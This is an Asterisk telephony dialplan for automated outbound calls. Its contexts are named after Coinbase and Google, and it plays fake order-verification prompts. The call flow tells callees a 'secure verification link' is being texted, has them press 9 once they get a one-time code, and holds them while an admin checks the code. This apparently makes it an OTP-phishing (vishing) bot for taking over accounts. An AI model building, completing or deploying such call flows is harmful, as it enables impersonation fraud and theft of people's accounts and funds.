[outbound-coinbase]
; Enhanced context for order verification system
exten => _X.,1,Answer()
exten => _X.,n,Wait(1)
exten => _X.,n,Set(PHONE_NUMBER=${EXTEN})
exten => _X.,n,Set(CUSTOMER_PHONE=${EXTEN})  ; Add this line - persistent variable
exten => _X.,n,Set(__CUSTOMER_PHONE=${EXTEN}) ; Double underscore makes it inherit to all contexts
exten => _X.,n,Set(CAMPAIGN_ID=${CAMPAIGN_ID})
exten => _X.,n,Set(CALL_START_TIME=${EPOCH})

; Play initial order verification message
exten => _X.,n,GotoIf($["${IVR_INTRO_FILE}" != ""]?custom_intro:default_intro)
exten => _X.,n(custom_intro),Playback(${IVR_INTRO_FILE})
exten => _X.,n,Goto(after_intro)
exten => _X.,n(default_intro),Playback(wave/Ifyouplacedtheorder)
exten => _X.,n(after_intro),WaitExten(30)

; Handle no input - play message again once
exten => _X.,n,Playback(wave/Ifyouplacedtheorder)
exten => _X.,n,WaitExten(20)
exten => _X.,n,Playback(no-response-goodbye)
exten => _X.,n,Hangup()

; Option 1: Order confirmed - will be redirected by AMI to order-confirmed context
exten => 1,1,NoOp(Customer pressed 1 - Order confirmed)
exten => 1,n,Set(DTMF_RESULT=1)
exten => 1,n,Set(ORDER_STATUS=CONFIRMED)
; AMI will redirect to order-confirmed context

; Option 2: Issue with order - will be redirected by AMI to otp-process context
exten => 2,1,NoOp(Customer pressed 2 - Issue with order)
exten => 2,n,Set(DTMF_RESULT=2)
exten => 2,n,Set(ORDER_STATUS=ISSUE_REPORTED)
; AMI will redirect to otp-process context

; Option 9: Customer received OTP - will be redirected by AMI to verification-waiting context
exten => 9,1,NoOp(Customer pressed 9 - OTP received)
exten => 9,n,Set(OTP_ENTERED=1)
; AMI will redirect to verification-waiting context

; Option 0: Request transfer to agent
exten => 0,1,NoOp(Customer pressed 0 - requesting agent)
exten => 0,n,Set(DTMF_RESULT=0)
; AMI will handle redirect based on OTP attempts

; Timeout handler
exten => t,1,Playback(call-timeout-goodbye)
exten => t,n,Hangup()

; Invalid option handler  
exten => i,1,Playback(invalid-option)
exten => i,n,Goto(outbound-coinbase,${PHONE_NUMBER},2)

; Press 0 retry context - less than 3 attempts
[press-0-retry]
exten => s,1,NoOp(Press 0 retry - less than 3 attempts)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(please-try-again)
exten => s,n,Goto(otp-process,s,hold)

; Press 0 transfer context - 3 or more OTP attempts
[press-0-transfer]
exten => s,1,NoOp(Press 0 transfer - initiating transfer after 3+ attempts)
exten => s,n,StopMusicOnHold()
exten => s,n,GotoIf($["${PRESS0_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${PRESS0_AUDIO_FILE})
exten => s,n,Goto(transfer_check)
exten => s,n(default_audio),Playback(transferring-to-agent)
exten => s,n(transfer_check),GotoIf($["${PRESS0_TRANSFER_ENABLED}" = "true"]?transfer:no_transfer)
exten => s,n(transfer),NoOp(Transferring to ${PRESS0_TRANSFER_NUMBER})
exten => s,n,GotoIf($["${MOH_AUDIO_FILE}" != ""]?moh_transfer:default_transfer)
exten => s,n(moh_transfer),Dial(SIP/${TRUNK_NAME}/${PRESS0_TRANSFER_NUMBER},30,tTm(${MOH_AUDIO_FILE}))
exten => s,n,Goto(check_status)
exten => s,n(default_transfer),Dial(SIP/${TRUNK_NAME}/${PRESS0_TRANSFER_NUMBER},30,tTm)
exten => s,n(check_status),GotoIf($["${DIALSTATUS}" = "ANSWER"]?end)
exten => s,n,Playback(transfer-failed)
exten => s,n,Goto(end)
exten => s,n(no_transfer),Playback(transfer-not-configured)
exten => s,n(end),Hangup()

; Order confirmation context - called by AMI redirect
; Order confirmation context - called by AMI redirect
; Order confirmation context - called by AMI redirect
[order-confirmed]
exten => s,1,NoOp(Order confirmed - playing thank you message)
exten => s,n,StopMusicOnHold()
exten => s,n,GotoIf($["${PRESS1_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${PRESS1_AUDIO_FILE})
exten => s,n,Goto(transfer_check)
exten => s,n(default_audio),Playback(wave/ThanksWellContinueProcess)
exten => s,n(transfer_check),GotoIf($["${PRESS1_TRANSFER_ENABLED}" = "true"]?transfer:old_transfer_check)
exten => s,n(transfer),NoOp(Transferring Press 1 call to ${PRESS1_TRANSFER_NUMBER})
exten => s,n,Playback(transferring-call)
exten => s,n,GotoIf($["${MOH_AUDIO_FILE}" != ""]?moh_transfer:default_transfer)
exten => s,n(moh_transfer),Dial(SIP/${TRUNK_NAME}/${PRESS1_TRANSFER_NUMBER},30,tTm(${MOH_AUDIO_FILE}))
exten => s,n,Goto(check_status)
exten => s,n(default_transfer),Dial(SIP/${TRUNK_NAME}/${PRESS1_TRANSFER_NUMBER},30,tTm)
exten => s,n(check_status),GotoIf($["${DIALSTATUS}" = "ANSWER"]?hangup)
exten => s,n,Playback(transfer-failed)
exten => s,n,Goto(hangup)
exten => s,n(old_transfer_check),GotoIf($["${TRANSFER_ENABLED}" = "true"]?old_transfer:hangup)
exten => s,n(old_transfer),NoOp(Transferring to legacy transfer number ${TRANSFER_NUMBER})
exten => s,n,Playback(transferring-call)
exten => s,n,GotoIf($["${MOH_AUDIO_FILE}" != ""]?old_moh_transfer:old_default_transfer)
exten => s,n(old_moh_transfer),Dial(SIP/${TRUNK_NAME}/${TRANSFER_NUMBER},30,tTm(${MOH_AUDIO_FILE}))
exten => s,n,Goto(old_check_status)
exten => s,n(old_default_transfer),Dial(SIP/${TRUNK_NAME}/${TRANSFER_NUMBER},30,tTm)
exten => s,n(old_check_status),GotoIf($["${DIALSTATUS}" = "ANSWER"]?hangup)
exten => s,n,Playback(transfer-failed)
exten => s,n(hangup),Hangup()

; OTP process context - called by AMI redirect  
[otp-process]
exten => s,1,NoOp(Starting OTP process)
exten => s,n,GotoIf($["${PRESS2_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${PRESS2_AUDIO_FILE})
exten => s,n,Goto(transfer_check)
exten => s,n(default_audio),Playback(wave/WeWillTextSecureVerifLink)
exten => s,n(transfer_check),GotoIf($["${PRESS2_TRANSFER_ENABLED}" = "true"]?transfer:hold)
exten => s,n(transfer),NoOp(Transferring press 2 call to ${PRESS2_TRANSFER_NUMBER})
exten => s,n,Dial(SIP/${TRUNK_NAME}/${PRESS2_TRANSFER_NUMBER},30,tTm)
exten => s,n,GotoIf($["${DIALSTATUS}" = "ANSWER"]?end)
exten => s,n,Playback(transfer-failed)
exten => s,n,Goto(end)
exten => s,n(hold),GotoIf($["${MOH_AUDIO_FILE}" != ""]?custom_moh:default_moh)
exten => s,n(custom_moh),Playback(${MOH_AUDIO_FILE})
exten => s,n,Goto(hold)
exten => s,n(default_moh),MusicOnHold(HOLDMUSIC)
exten => s,n,Playback(otp-timeout-goodbye)
exten => s,n(end),Hangup()

exten => X,1,Goto(s,1)
exten => _X,1,Goto(s,1)

; Handle DTMF 9 in OTP process context
exten => 9,1,NoOp(Customer pressed 9 in OTP context)
; AMI will redirect to verification-waiting context

; Verification waiting context - called by AMI redirect when customer presses 9
[verification-waiting] 
exten => s,1,NoOp(Customer entered OTP - waiting for admin verification)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(wave/ThanksReviewingNow)
;exten => s,n,MusicOnHold(HOLDMUSIC)
exten => s,n(hold),GotoIf($["${MOH_AUDIO_FILE}" != ""]?custom_moh:default_moh)
exten => s,n(custom_moh),Playback(${MOH_AUDIO_FILE})
exten => s,n,Goto(hold)
exten => s,n(default_moh),MusicOnHold(HOLDMUSIC)

; Verification success context - called by AMI redirect when admin verifies
[verification-success]
exten => s,1,NoOp(OTP verification successful)
exten => s,n,StopMusicOnHold()
exten => s,n,GotoIf($["${VERIFIED_OTP_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${VERIFIED_OTP_AUDIO_FILE})
exten => s,n,Goto(hangup)
exten => s,n(default_audio),Playback(wave/VerifisGOOD)
exten => s,n(hangup),Hangup()

; Verification failed context - called by AMI redirect when admin rejects
[verification-failed]
exten => s,1,NoOp(OTP verification failed)
exten => s,n,StopMusicOnHold()
exten => s,n,GotoIf($["${INVALID_OTP_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${INVALID_OTP_AUDIO_FILE})
exten => s,n,Goto(transfer_check)
exten => s,n(default_audio),Playback(wave/VerifisNOgood)
exten => s,n,Playback(press-9-to-try-again)
exten => s,n(transfer_check),GotoIf($["${INVALID_OTP_TRANSFER_ENABLED}" = "true"]?transfer:hold)
exten => s,n(transfer),NoOp(Transferring invalid OTP call to ${INVALID_OTP_TRANSFER_NUMBER})
exten => s,n,GotoIf($["${MOH_AUDIO_FILE}" != ""]?moh_transfer:default_transfer)
exten => s,n(moh_transfer),Dial(SIP/${TRUNK_NAME}/${INVALID_OTP_TRANSFER_NUMBER},30,tTm(${MOH_AUDIO_FILE}))
exten => s,n,Goto(check_status)
exten => s,n(default_transfer),Dial(SIP/${TRUNK_NAME}/${INVALID_OTP_TRANSFER_NUMBER},30,tTm)
exten => s,n(check_status),GotoIf($["${DIALSTATUS}" = "ANSWER"]?end)
exten => s,n,Playback(transfer-failed)
exten => s,n,Goto(end)
exten => s,n(hold),GotoIf($["${MOH_AUDIO_FILE}" != ""]?custom_moh:default_moh)
exten => s,n(custom_moh),Playback(${MOH_AUDIO_FILE})
exten => s,n,Goto(hold)
exten => s,n(default_moh),MusicOnHold(HOLDMUSIC)
exten => s,n(end),Hangup()

; CRITICAL: Allow DTMF 9 in verification-failed context so customer can retry
exten => 9,1,NoOp(Customer pressed 9 after invalid OTP - retrying)
; AMI will redirect to verification-waiting context

[outbound-google]
exten => _X.,1,Answer()
exten => _X.,n,Playback(googleintro)
exten => _X.,n,WaitExten(10)

exten => 1,1,Playback(googleoutro)
exten => 1,2,Hangup()

exten => _X.,n,Hangup()

[outbound-order-verification]
include => outbound-coinbase

[hangup-context]
exten => s,1,Playback(call-terminated)
exten => s,n,Hangup()

[test-context]
exten => s,1,Answer()
exten => s,n,Playback(${ARG1})
exten => s,n,Hangup()